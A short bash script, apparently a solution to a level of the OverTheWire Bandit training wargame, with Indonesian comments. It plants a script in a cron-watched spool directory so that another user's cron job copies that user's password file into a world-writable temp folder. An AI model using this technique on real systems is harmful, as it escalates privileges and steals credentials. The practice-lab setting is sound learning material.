#!/bin/bash
i=$RANDOM
echo "i = $i"
mkdir /tmp/afif$i
chmod 777 /tmp/afif$i
cd /var/spool/bandit24/foo
echo 'cat /etc/bandit_pass/bandit24 > /tmp/afif'$i'/password.txt' > /var/spool/bandit24/foo/s.sh
cat /var/spool/bandit24/foo/s.sh
chmod +x /var/spool/bandit24/foo/s.sh
ls -l /var/spool/bandit24/foo/s.sh
echo "cek ke /tmp/afif$i"
ls -la /tmp/afif$i
echo "tunggu 1 menit buat cronjob eksekusi"
